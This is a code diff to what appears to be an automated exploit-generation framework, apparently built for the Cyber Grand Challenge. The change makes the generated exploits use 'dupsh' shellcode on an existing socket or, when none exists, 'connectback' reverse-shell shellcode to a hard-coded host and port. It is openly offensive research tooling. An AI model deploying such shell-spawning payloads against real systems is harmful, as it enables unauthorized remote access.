@@ -166,6 +166,7 @@ class Crash:
             else:
                 kwargs["blacklist_techniques"] = {"explore_for_exploit"}
 
+        our_open_fd = None
         if self.input_type == CrashInputType.TCP:
             opts = kwargs.get('shellcode_opts', {})
             # are there open sockets that can receive our input?
@@ -182,8 +183,15 @@ class Crash:
                 # try dupsh to get a shell
                 opts['default'] = 'dupsh'
                 opts['shellcode_args'] = open_fds
+                our_open_fd = open_fds['fd'][0]
+            else:
+                # There is no open socket, need to connect back
+                opts['default'] = 'connectback'
+                # TODO: change these and parameterize them
+                opts['shellcode_args'] = {'host': "127.0.0.1", "port": 9999}
 
             kwargs['shellcode_opts'] = opts
+            kwargs['our_open_fd'] = our_open_fd
 
         if self.is_cgc:
             exploit = CGCExploitFactory(self, **kwargs)
